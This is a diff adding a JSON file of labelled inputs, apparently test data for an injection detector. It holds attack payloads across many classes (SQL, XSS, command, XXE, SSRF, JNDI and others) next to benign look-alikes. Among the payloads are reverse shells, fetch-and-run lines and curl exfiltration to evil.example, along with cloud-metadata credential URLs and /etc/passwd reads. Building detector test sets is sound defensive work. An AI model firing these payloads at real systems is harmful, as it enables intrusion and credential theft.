@@ -1,0 +1,1002 @@
+[
+ {
+  "category": "sqli",
+  "kind": "mal",
+  "payload": "' OR '1'='1"
+ },
+ {
+  "category": "sqli",
+  "kind": "mal",
+  "payload": "1' OR '1'='1' -- "
+ },
+ {
+  "category": "sqli",
+  "kind": "mal",
+  "payload": "admin'--"
+ },
+ {
+  "category": "sqli",
+  "kind": "mal",
+  "payload": "admin' #"
+ },
+ {
+  "category": "sqli",
+  "kind": "mal",
+  "payload": "'; DROP TABLE users;--"
+ },
+ {
+  "category": "sqli",
+  "kind": "mal",
+  "payload": "1 UNION SELECT username,password FROM users"
+ },
+ {
+  "category": "sqli",
+  "kind": "mal",
+  "payload": "' UNION ALL SELECT NULL,NULL,NULL--"
+ },
+ {
+  "category": "sqli",
+  "kind": "mal",
+  "payload": "' UNION SELECT @@version,2,3--"
+ },
+ {
+  "category": "sqli",
+  "kind": "mal",
+  "payload": "' OR SLEEP(5)--"
+ },
+ {
+  "category": "sqli",
+  "kind": "mal",
+  "payload": "1;WAITFOR DELAY '0:0:5'--"
+ },
+ {
+  "category": "sqli",
+  "kind": "mal",
+  "payload": "' AND extractvalue(1,concat(0x7e,version()))--"
+ },
+ {
+  "category": "sqli",
+  "kind": "mal",
+  "payload": "'; EXEC xp_cmdshell('whoami')--"
+ },
+ {
+  "category": "sqli",
+  "kind": "mal",
+  "payload": "\") OR (\"1\"=\"1"
+ },
+ {
+  "category": "sqli",
+  "kind": "mal",
+  "payload": "' AND 1=CONVERT(int,@@version)--"
+ },
+ {
+  "category": "sqli",
+  "kind": "mal",
+  "payload": "1' AND '1'='1' UNION SELECT load_file('/etc/passwd')--"
+ },
+ {
+  "category": "sqli",
+  "kind": "mal",
+  "payload": "%27%20OR%201=1--"
+ },
+ {
+  "category": "sqli",
+  "kind": "mal",
+  "payload": "0x27206f7220313d31"
+ },
+ {
+  "category": "sqli",
+  "kind": "mal",
+  "payload": "' oR/**/1=1#"
+ },
+ {
+  "category": "sqli",
+  "kind": "mal",
+  "payload": "' Or 1=1 Limit 1 -- "
+ },
+ {
+  "category": "sqli",
+  "kind": "mal",
+  "payload": "1') OR ('a'='a"
+ },
+ {
+  "category": "sqli",
+  "kind": "mal",
+  "payload": "'||(SELECT pass FROM users LIMIT 1)||'"
+ },
+ {
+  "category": "sqli",
+  "kind": "mal",
+  "payload": "' OR 1=1 INTO OUTFILE '/tmp/x'--"
+ },
+ {
+  "category": "xss",
+  "kind": "mal",
+  "payload": "<script>alert(1)</script>"
+ },
+ {
+  "category": "xss",
+  "kind": "mal",
+  "payload": "<img src=x onerror=alert(document.cookie)>"
+ },
+ {
+  "category": "xss",
+  "kind": "mal",
+  "payload": "javascript:alert(1)"
+ },
+ {
+  "category": "xss",
+  "kind": "mal",
+  "payload": "<svg/onload=alert(1)>"
+ },
+ {
+  "category": "xss",
+  "kind": "mal",
+  "payload": "\"><script>alert(String.fromCharCode(88))</script>"
+ },
+ {
+  "category": "xss",
+  "kind": "mal",
+  "payload": "<body onload=alert(1)>"
+ },
+ {
+  "category": "xss",
+  "kind": "mal",
+  "payload": "<iframe src=\"javascript:alert(1)\">"
+ },
+ {
+  "category": "xss",
+  "kind": "mal",
+  "payload": "<input autofocus onfocus=alert(1)>"
+ },
+ {
+  "category": "xss",
+  "kind": "mal",
+  "payload": "<details open ontoggle=alert(1)>"
+ },
+ {
+  "category": "xss",
+  "kind": "mal",
+  "payload": "<marquee onstart=alert(1)>"
+ },
+ {
+  "category": "xss",
+  "kind": "mal",
+  "payload": "<a href=\"javascript:alert(1)\">x</a>"
+ },
+ {
+  "category": "xss",
+  "kind": "mal",
+  "payload": "<scr<script>ipt>alert(1)</scr</script>ipt>"
+ },
+ {
+  "category": "xss",
+  "kind": "mal",
+  "payload": "'-alert(1)-'"
+ },
+ {
+  "category": "xss",
+  "kind": "mal",
+  "payload": "<img src=1 onerror=\"&#97;lert(1)\">"
+ },
+ {
+  "category": "xss",
+  "kind": "mal",
+  "payload": "<svg><animate onbegin=alert(1) attributeName=x>"
+ },
+ {
+  "category": "xss",
+  "kind": "mal",
+  "payload": "<select autofocus onfocus=alert(1)>"
+ },
+ {
+  "category": "xss",
+  "kind": "mal",
+  "payload": "<video><source onerror=alert(1)>"
+ },
+ {
+  "category": "xss",
+  "kind": "mal",
+  "payload": "javascript:/*--></title></style></script><svg onload=alert(1)>"
+ },
+ {
+  "category": "xss",
+  "kind": "mal",
+  "payload": "%3Cscript%3Ealert(1)%3C/script%3E"
+ },
+ {
+  "category": "xss",
+  "kind": "mal",
+  "payload": "<x onclick=alert(1)>click"
+ },
+ {
+  "category": "xss",
+  "kind": "mal",
+  "payload": "<object data=\"javascript:alert(1)\">"
+ },
+ {
+  "category": "xss",
+  "kind": "mal",
+  "payload": "<math><mtext><script>alert(1)</script>"
+ },
+ {
+  "category": "cmdi",
+  "kind": "mal",
+  "payload": "; cat /etc/passwd"
+ },
+ {
+  "category": "cmdi",
+  "kind": "mal",
+  "payload": "| whoami"
+ },
+ {
+  "category": "cmdi",
+  "kind": "mal",
+  "payload": "$(id)"
+ },
+ {
+  "category": "cmdi",
+  "kind": "mal",
+  "payload": "`id`"
+ },
+ {
+  "category": "cmdi",
+  "kind": "mal",
+  "payload": "&& ls -la /"
+ },
+ {
+  "category": "cmdi",
+  "kind": "mal",
+  "payload": "; rm -rf /tmp/x"
+ },
+ {
+  "category": "cmdi",
+  "kind": "mal",
+  "payload": "|| curl http://evil.example/$(whoami)"
+ },
+ {
+  "category": "cmdi",
+  "kind": "mal",
+  "payload": "; nc -e /bin/sh 10.0.0.1 4444"
+ },
+ {
+  "category": "cmdi",
+  "kind": "mal",
+  "payload": "; ping -c 4 127.0.0.1"
+ },
+ {
+  "category": "cmdi",
+  "kind": "mal",
+  "payload": "$(python -c 'import os;os.system(\"id\")')"
+ },
+ {
+  "category": "cmdi",
+  "kind": "mal",
+  "payload": "%0acat%20/etc/passwd"
+ },
+ {
+  "category": "cmdi",
+  "kind": "mal",
+  "payload": "; sleep 5"
+ },
+ {
+  "category": "cmdi",
+  "kind": "mal",
+  "payload": "& type C:\\\\Windows\\\\win.ini"
+ },
+ {
+  "category": "cmdi",
+  "kind": "mal",
+  "payload": "$IFS$9cat$IFS/etc/passwd"
+ },
+ {
+  "category": "cmdi",
+  "kind": "mal",
+  "payload": "{cat,/etc/passwd}"
+ },
+ {
+  "category": "cmdi",
+  "kind": "mal",
+  "payload": ";curl${IFS}evil.example"
+ },
+ {
+  "category": "cmdi",
+  "kind": "mal",
+  "payload": "`wget http://evil.example/x.sh -O- | sh`"
+ },
+ {
+  "category": "cmdi",
+  "kind": "mal",
+  "payload": "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+ },
+ {
+  "category": "path",
+  "kind": "mal",
+  "payload": "../../../etc/passwd"
+ },
+ {
+  "category": "path",
+  "kind": "mal",
+  "payload": "..%2f..%2f..%2fetc%2fpasswd"
+ },
+ {
+  "category": "path",
+  "kind": "mal",
+  "payload": "....//....//etc/shadow"
+ },
+ {
+  "category": "path",
+  "kind": "mal",
+  "payload": "..\\..\\..\\windows\\win.ini"
+ },
+ {
+  "category": "path",
+  "kind": "mal",
+  "payload": "%2e%2e%2f%2e%2e%2fetc/passwd"
+ },
+ {
+  "category": "path",
+  "kind": "mal",
+  "payload": "/proc/self/environ"
+ },
+ {
+  "category": "path",
+  "kind": "mal",
+  "payload": "file:///etc/passwd"
+ },
+ {
+  "category": "path",
+  "kind": "mal",
+  "payload": "/var/www/html/../../../../etc/passwd"
+ },
+ {
+  "category": "path",
+  "kind": "mal",
+  "payload": "..%252f..%252fetc/passwd"
+ },
+ {
+  "category": "path",
+  "kind": "mal",
+  "payload": "..%c0%af..%c0%afetc/passwd"
+ },
+ {
+  "category": "path",
+  "kind": "mal",
+  "payload": "/etc/passwd%00.png"
+ },
+ {
+  "category": "path",
+  "kind": "mal",
+  "payload": "....\\\\....\\\\boot.ini"
+ },
+ {
+  "category": "path",
+  "kind": "mal",
+  "payload": "php://filter/convert.base64-encode/resource=/etc/passwd"
+ },
+ {
+  "category": "path",
+  "kind": "mal",
+  "payload": "/..%5c..%5c..%5cwindows/system32/drivers/etc/hosts"
+ },
+ {
+  "category": "ssrf",
+  "kind": "mal",
+  "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+ },
+ {
+  "category": "ssrf",
+  "kind": "mal",
+  "payload": "http://localhost:6379/"
+ },
+ {
+  "category": "ssrf",
+  "kind": "mal",
+  "payload": "gopher://127.0.0.1:11211/_stats"
+ },
+ {
+  "category": "ssrf",
+  "kind": "mal",
+  "payload": "dict://127.0.0.1:11211/stat"
+ },
+ {
+  "category": "ssrf",
+  "kind": "mal",
+  "payload": "http://[::ffff:169.254.169.254]/"
+ },
+ {
+  "category": "ssrf",
+  "kind": "mal",
+  "payload": "http://127.0.0.1:22"
+ },
+ {
+  "category": "ssrf",
+  "kind": "mal",
+  "payload": "http://0.0.0.0:8080/admin"
+ },
+ {
+  "category": "ssrf",
+  "kind": "mal",
+  "payload": "http://metadata.google.internal/computeMetadata/v1/"
+ },
+ {
+  "category": "ssrf",
+  "kind": "mal",
+  "payload": "http://2130706433/"
+ },
+ {
+  "category": "ssrf",
+  "kind": "mal",
+  "payload": "file:///proc/self/cwd"
+ },
+ {
+  "category": "ssrf",
+  "kind": "mal",
+  "payload": "ftp://127.0.0.1/"
+ },
+ {
+  "category": "ssrf",
+  "kind": "mal",
+  "payload": "http://localhost%2f%2e%2e/admin"
+ },
+ {
+  "category": "jndi",
+  "kind": "mal",
+  "payload": "${jndi:ldap://evil.example/a}"
+ },
+ {
+  "category": "jndi",
+  "kind": "mal",
+  "payload": "${jndi:rmi://x.example/y}"
+ },
+ {
+  "category": "jndi",
+  "kind": "mal",
+  "payload": "${${lower:j}ndi:dns://x.example}"
+ },
+ {
+  "category": "jndi",
+  "kind": "mal",
+  "payload": "${env:AWS_SECRET_ACCESS_KEY}"
+ },
+ {
+  "category": "jndi",
+  "kind": "mal",
+  "payload": "${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/aWQ=}"
+ },
+ {
+  "category": "jndi",
+  "kind": "mal",
+  "payload": "${sys:user.name}"
+ },
+ {
+  "category": "jndi",
+  "kind": "mal",
+  "payload": "${jndi:${lower:l}${lower:d}ap://x}"
+ },
+ {
+  "category": "jndi",
+  "kind": "mal",
+  "payload": "${date:YYYY}"
+ },
+ {
+  "category": "ssti",
+  "kind": "mal",
+  "payload": "{{7*7}}"
+ },
+ {
+  "category": "ssti",
+  "kind": "mal",
+  "payload": "${7*7}"
+ },
+ {
+  "category": "ssti",
+  "kind": "mal",
+  "payload": "<%= 7*7 %>"
+ },
+ {
+  "category": "ssti",
+  "kind": "mal",
+  "payload": "#{7*7}"
+ },
+ {
+  "category": "ssti",
+  "kind": "mal",
+  "payload": "{{config.items()}}"
+ },
+ {
+  "category": "ssti",
+  "kind": "mal",
+  "payload": "{{''.__class__.__mro__[2].__subclasses__()}}"
+ },
+ {
+  "category": "ssti",
+  "kind": "mal",
+  "payload": "${T(java.lang.Runtime).getRuntime().exec('id')}"
+ },
+ {
+  "category": "ssti",
+  "kind": "mal",
+  "payload": "{{request.application.__globals__}}"
+ },
+ {
+  "category": "ssti",
+  "kind": "mal",
+  "payload": "@(7*7)"
+ },
+ {
+  "category": "ssti",
+  "kind": "mal",
+  "payload": "{%if 1%}x{%endif%}"
+ },
+ {
+  "category": "xxe",
+  "kind": "mal",
+  "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+ },
+ {
+  "category": "xxe",
+  "kind": "mal",
+  "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY e SYSTEM 'file:///etc/passwd'>]><r>&e;</r>"
+ },
+ {
+  "category": "xxe",
+  "kind": "mal",
+  "payload": "<!ENTITY % xxe SYSTEM \"http://evil.example/x\">"
+ },
+ {
+  "category": "xxe",
+  "kind": "mal",
+  "payload": "<!DOCTYPE x [<!ENTITY % a SYSTEM 'file:///etc/passwd'><!ENTITY % b '<!ENTITY c \"%a;\">'>%b;]>"
+ },
+ {
+  "category": "xxe",
+  "kind": "mal",
+  "payload": "<?xml version=\"1.0\" encoding=\"UTF-7\"?>"
+ },
+ {
+  "category": "xxe",
+  "kind": "mal",
+  "payload": "<!DOCTYPE r SYSTEM \"http://evil.example/r.dtd\">"
+ },
+ {
+  "category": "nosql",
+  "kind": "mal",
+  "payload": "{\"$gt\":\"\"}"
+ },
+ {
+  "category": "nosql",
+  "kind": "mal",
+  "payload": "{\"$ne\":null}"
+ },
+ {
+  "category": "nosql",
+  "kind": "mal",
+  "payload": "';return true;//"
+ },
+ {
+  "category": "nosql",
+  "kind": "mal",
+  "payload": "admin' || '1'=='1"
+ },
+ {
+  "category": "nosql",
+  "kind": "mal",
+  "payload": "{\"$where\":\"sleep(5000)\"}"
+ },
+ {
+  "category": "nosql",
+  "kind": "mal",
+  "payload": "{\"username\":{\"$regex\":\".*\"}}"
+ },
+ {
+  "category": "nosql",
+  "kind": "mal",
+  "payload": "[$ne]=1"
+ },
+ {
+  "category": "nosql",
+  "kind": "mal",
+  "payload": "{\"$gt\":undefined}"
+ },
+ {
+  "category": "ldap",
+  "kind": "mal",
+  "payload": "*)(uid=*))(|(uid=*"
+ },
+ {
+  "category": "ldap",
+  "kind": "mal",
+  "payload": "*()|%26'"
+ },
+ {
+  "category": "ldap",
+  "kind": "mal",
+  "payload": "admin)(&)"
+ },
+ {
+  "category": "ldap",
+  "kind": "mal",
+  "payload": "*)(objectClass=*"
+ },
+ {
+  "category": "ldap",
+  "kind": "mal",
+  "payload": "*)(|(password=*))"
+ },
+ {
+  "category": "crlf",
+  "kind": "mal",
+  "payload": "foo\r\nSet-Cookie: sessid=hijacked"
+ },
+ {
+  "category": "crlf",
+  "kind": "mal",
+  "payload": "x%0d%0aLocation:%20http://evil.example"
+ },
+ {
+  "category": "crlf",
+  "kind": "mal",
+  "payload": "%0d%0aContent-Length:%200%0d%0a%0d%0a"
+ },
+ {
+  "category": "crlf",
+  "kind": "mal",
+  "payload": "test%0aSet-Cookie:%20admin=true"
+ },
+ {
+  "category": "crlf",
+  "kind": "mal",
+  "payload": "%E5%98%8D%E5%98%8ASet-Cookie:%20x=1"
+ },
+ {
+  "category": "crlf",
+  "kind": "mal",
+  "payload": "a\r\nHost: evil.example"
+ },
+ {
+  "category": "crlf",
+  "kind": "mal",
+  "payload": "%0d%0a%0d%0a<script>alert(1)</script>"
+ },
+ {
+  "category": "crlf",
+  "kind": "mal",
+  "payload": "/%0d%0aX-Injected: true"
+ },
+ {
+  "category": "redirect",
+  "kind": "mal",
+  "payload": "//evil.example"
+ },
+ {
+  "category": "redirect",
+  "kind": "mal",
+  "payload": "https://evil.example"
+ },
+ {
+  "category": "redirect",
+  "kind": "mal",
+  "payload": "/\\evil.example"
+ },
+ {
+  "category": "redirect",
+  "kind": "mal",
+  "payload": "javascript:alert(document.domain)"
+ },
+ {
+  "category": "redirect",
+  "kind": "mal",
+  "payload": "data:text/html,<script>alert(1)</script>"
+ },
+ {
+  "category": "deser",
+  "kind": "mal",
+  "payload": "O:8:\"stdClass\":0:{}"
+ },
+ {
+  "category": "deser",
+  "kind": "mal",
+  "payload": "rO0ABXNyAA=="
+ },
+ {
+  "category": "deser",
+  "kind": "mal",
+  "payload": "__import__('os').system('id')"
+ },
+ {
+  "category": "deser",
+  "kind": "mal",
+  "payload": "{\"__proto__\":{\"isAdmin\":true}}"
+ },
+ {
+  "category": "deser",
+  "kind": "mal",
+  "payload": "constructor[prototype][isAdmin]=true"
+ },
+ {
+  "category": "deser",
+  "kind": "mal",
+  "payload": "!!python/object/apply:os.system ['id']"
+ },
+ {
+  "category": "graphql",
+  "kind": "mal",
+  "payload": "query{__schema{types{name}}}"
+ },
+ {
+  "category": "graphql",
+  "kind": "mal",
+  "payload": "{user(id:\"1 OR 1=1\"){name}}"
+ },
+ {
+  "category": "graphql",
+  "kind": "mal",
+  "payload": "mutation{deleteAllUsers}"
+ },
+ {
+  "category": "header",
+  "kind": "mal",
+  "payload": "() { :;}; /bin/cat /etc/passwd"
+ },
+ {
+  "category": "header",
+  "kind": "mal",
+  "payload": "User-Agent: () { :; }; echo vuln"
+ },
+ {
+  "category": "header",
+  "kind": "mal",
+  "payload": "X-Forwarded-For: 127.0.0.1, evil"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "SELECT a plan that fits your team"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "I'll alert you the moment it's ready"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "the union of designers and engineers"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "price > 100 AND rating < 5 stars"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "1=1 is a tautology we cover in math class"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "O'Brien"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "D'Angelo & Sons, Inc."
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "user@example.com"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "https://maps.example.com/?q=cafe+near+me"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "function() { return total * 1.2; }"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "<b>Bold</b> and <i>italic</i> text"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "José from São Paulo, naïve café"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "path/to/my/report.2024.json"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "drop me an email when you can"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "a great script for the school play"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "SELECT-O-MATIC vacuum, model X"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "comment count: 42; likes: 1337"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "Mëtàl Ümläut Bänd — live in concert"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "C:\\\\Users\\\\me\\\\Documents\\\\file.txt"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "2 * 7 = 14 and 7 * 7 = 49"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "order by date, then by name please"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "the cat sat on the mat"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "{\"name\":\"Acme\",\"qty\":3,\"price\":9.99}"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "search: best practices for REST APIs"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "passwd reset link requested"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NSJ9.abc"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "git commit -m 'fix the parser'"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "let x = a && b || c;"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "the script kiddie movie was fun"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "100% organic & fair-trade"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "我喜欢编程 and I love coding"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "naïve approach to the problem"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "Schrödinger's cat is both"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "https://en.wikipedia.org/wiki/SQL_injection"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "regex: ^[a-z]+$ matches lowercase"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "a < b and b > c"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "<!-- this is an HTML comment -->"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "SELECT * is an anti-pattern, avoid it"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "alert: low disk space on /var"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "the password must be 12+ chars"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "Q1 revenue grew 7*7 percent (kidding)"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "DROP-DOWN menu styling"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "use UNION types in TypeScript"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "../docs/readme.md relative link"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "cmd+shift+p opens the palette"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "{{ user.name }} in a Jinja template doc"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "$HOME/.config/app.toml"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "exec summary attached"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "id: 12345, name: Acme Corp"
+ },
+ {
+  "category": "benign",
+  "kind": "benign",
+  "payload": "onclick handlers should be CSP-safe"
+ }
+]
